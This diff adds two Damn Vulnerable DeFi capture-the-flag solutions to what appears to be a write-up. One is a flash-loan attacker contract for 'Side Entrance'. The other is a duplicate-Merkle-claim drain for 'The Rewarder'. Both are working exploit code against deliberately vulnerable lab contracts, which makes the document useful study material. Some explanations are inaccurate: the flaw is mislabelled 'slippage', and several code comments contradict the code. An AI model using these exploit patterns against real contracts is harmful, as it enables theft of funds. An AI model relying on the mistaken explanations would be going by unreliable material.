@@ -175,3 +175,202 @@ contract MaliciousUser {
 ```
 
 </details>
+
+### 4. Side Entrance
+
+In many case above, the format of the funds is wrapped by an ERC-2O token. But here, the flashloan is provided with native ether. The problem arise with slippage protection. Let's jump into the code : 
+
+<details>
+
+<summary> Code </summary>
+
+```javascript
+ function flashLoan(uint256 amount) external {
+        uint256 balanceBefore = address(this).balance;
+
+        IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();
+
+@>      if (address(this).balance < balanceBefore) {
+            revert RepayFailed();
+        }
+    }
+```
+
+</details>
+
+The vulnerability lies in slippage when the protocol checks the total balance before and after transactions. So, i have an idea that we can take a flashloan. After that, we make a deposit directly to ensure that the total balance before and after transaction stays same. Let's jump into this scenario :
+- The attacker take a flashloan with all of amount the pool
+- After that, the attacker make a deposit to the pool to make total balances stay same
+- The attacker send to the balance to the recovery account
+
+<details>
+
+<summary> Solution </summary>
+
+```javascript
+ function test_sideEntrance() public checkSolvedByPlayer {
+        MaliciousUser attacker = new MaliciousUser(address(pool));
+        attacker.attack();
+        attacker.sendToRecovery(recovery);
+    }
+
+contract MaliciousUser is IFlashLoanEtherReceiver {
+    SideEntranceLenderPool pool;
+
+    constructor(address _pool) {
+        pool = SideEntranceLenderPool(_pool);
+    }
+
+    function attack() public {
+        uint256 amountOfPool = address(pool).balance;
+        pool.flashLoan(amountOfPool);
+    }
+
+    function execute() external payable {
+        pool.deposit{value: address(this).balance}();
+    }
+
+    function sendToRecovery(address _recovery) public {
+        pool.withdraw();
+
+        (bool sucsess, ) = _recovery.call{value: address(this).balance}("");
+        require(sucsess, "Send failed");
+    }
+
+    receive() external payable {}
+}
+
+```
+
+</details>
+
+### 5. The rewarder
+
+Let’s break down the `test_theRewarder` function, which is designed to interact with a reward distribution system in a DeFi application. This function involves claiming rewards from a distribution contract and then transferring the claimed rewards to a recovery address.
+
+#### Function Breakdown
+
+<details>
+
+<summary> Code </summary>
+
+
+```javascript
+function test_theRewarder() public checkSolvedByPlayer {
+    IERC20[] memory tokensToClaim = new IERC20[](2);
+    tokensToClaim[0] = IERC20(address(dvt));
+    tokensToClaim[1] = IERC20(address(weth));
+
+    bytes32[] memory dvtLeaves = _loadRewards("/test/the-rewarder/dvt-distribution.json");
+    bytes32[] memory wethLeaves = _loadRewards("/test/the-rewarder/weth-distribution.json");
+
+    uint256 player_amount_dvt = 11524763827831882;
+    uint256 player_amount_weth = 1171088749244340;
+
+    uint256 txDvt = TOTAL_DVT_DISTRIBUTION_AMOUNT / player_amount_dvt;
+    uint256 txWeth = TOTAL_WETH_DISTRIBUTION_AMOUNT / player_amount_weth;
+    uint256 txTotal = txDvt + txWeth;
+
+    Claim[] memory claimsOfPlayer = new Claim[](txTotal);
+    for(uint i; i < txTotal; i++){
+        if(i < txDvt){
+            claimsOfPlayer[i] = Claim({
+                batchNumber: 0, // claim corresponds to first DVT batch
+                amount: player_amount_dvt,
+                tokenIndex: 0, // claim corresponds to first token in `tokensToClaim` array
+                proof: merkle.getProof(dvtLeaves, 188) // Alice's address is at index 2
+            });  
+        }else{
+            claimsOfPlayer[i] = Claim({
+                batchNumber: 0, // claim corresponds to first DVT batch
+                amount: player_amount_weth,
+                tokenIndex: 1, // claim corresponds to second token in `tokensToClaim` array
+                proof: merkle.getProof(wethLeaves, 188) // Alice's address is at index 2
+            });
+        }
+    }
+    
+    distributor.claimRewards({inputClaims: claimsOfPlayer, inputTokens: tokensToClaim});
+    weth.transfer(recovery, weth.balanceOf(player));
+    dvt.transfer(recovery, dvt.balanceOf(player));
+}
+```
+
+</details>
+
+#### Detailed Explanation
+
+1. **Define Tokens to Claim:**
+   ```javascript
+   IERC20[] memory tokensToClaim = new IERC20[](2);
+   tokensToClaim[0] = IERC20(address(dvt));
+   tokensToClaim[1] = IERC20(address(weth));
+   ```
+   - Create an array `tokensToClaim` that holds two ERC20 tokens: `dvt` and `weth`. These are the tokens from which rewards will be claimed.
+
+2. **Load Merkle Tree Leaves:**
+   ```javascript
+   bytes32[] memory dvtLeaves = _loadRewards("/test/the-rewarder/dvt-distribution.json");
+   bytes32[] memory wethLeaves = _loadRewards("/test/the-rewarder/weth-distribution.json");
+   ```
+   - Load the Merkle tree leaves for DVT and WETH distributions from JSON files. These leaves will be used to prove the validity of the claims.
+
+3. **Define Amounts and Calculations:**
+   ```javascript
+   uint256 player_amount_dvt = 11524763827831882;
+   uint256 player_amount_weth = 1171088749244340;
+   ```
+   - These are the amounts of DVT and WETH that the player is expected to claim.
+
+   ```javascript
+   uint256 txDvt = TOTAL_DVT_DISTRIBUTION_AMOUNT / player_amount_dvt;
+   uint256 txWeth = TOTAL_WETH_DISTRIBUTION_AMOUNT / player_amount_weth;
+   uint256 txTotal = txDvt + txWeth;
+   ```
+   - Calculate the number of claims needed for both DVT and WETH based on the total distribution amount and the player’s claim amounts. `txTotal` represents the total number of claims.
+
+4. **Create Claims Array:**
+   ```javascript
+   Claim[] memory claimsOfPlayer = new Claim[](txTotal);
+   for(uint i; i < txTotal; i++){
+       if(i < txDvt){
+           claimsOfPlayer[i] = Claim({
+               batchNumber: 0, // claim corresponds to first DVT batch
+               amount: player_amount_dvt,
+               tokenIndex: 0, // claim corresponds to first token in `tokensToClaim` array
+               proof: merkle.getProof(dvtLeaves, 188) // Alice's address is at index 2
+           });  
+       }else{
+           claimsOfPlayer[i] = Claim({
+               batchNumber: 0, // claim corresponds to first DVT batch
+               amount: player_amount_weth,
+               tokenIndex: 1, // claim corresponds to second token in `tokensToClaim` array
+               proof: merkle.getProof(wethLeaves, 188) // Alice's address is at index 2
+           });
+       }
+   }
+   ```
+   - Initialize an array `claimsOfPlayer` of size `txTotal`. Each entry in the array is a `Claim` object.
+   - Loop through the total claims and populate each `Claim` object based on whether it is for DVT or WETH. Use Merkle proofs for each claim to validate it.
+
+5. **Claim Rewards:**
+   ```javascript
+   distributor.claimRewards({inputClaims: claimsOfPlayer, inputTokens: tokensToClaim});
+   ```
+   - Call the `claimRewards` function on the `distributor` contract to claim the rewards using the `claimsOfPlayer` and `tokensToClaim` arrays.
+
+6. **Transfer Claimed Tokens:**
+   ```javascript
+   weth.transfer(recovery, weth.balanceOf(player));
+   dvt.transfer(recovery, dvt.balanceOf(player));
+   ```
+   - Transfer the entire balance of WETH and DVT held by the player to a recovery address. This action ensures that the claimed rewards are moved to a secure address.
+
+#### Summary
+
+The `test_theRewarder` function is designed to:
+- Prepare and submit claims for rewards from a reward distribution contract.
+- Use Merkle proofs to authenticate the claims.
+- Transfer the claimed rewards to a specified recovery address.
+
+This function is typically used to demonstrate how to exploit vulnerabilities in reward distribution mechanisms or to ensure the correct implementation of reward claiming logic in a DeFi application.
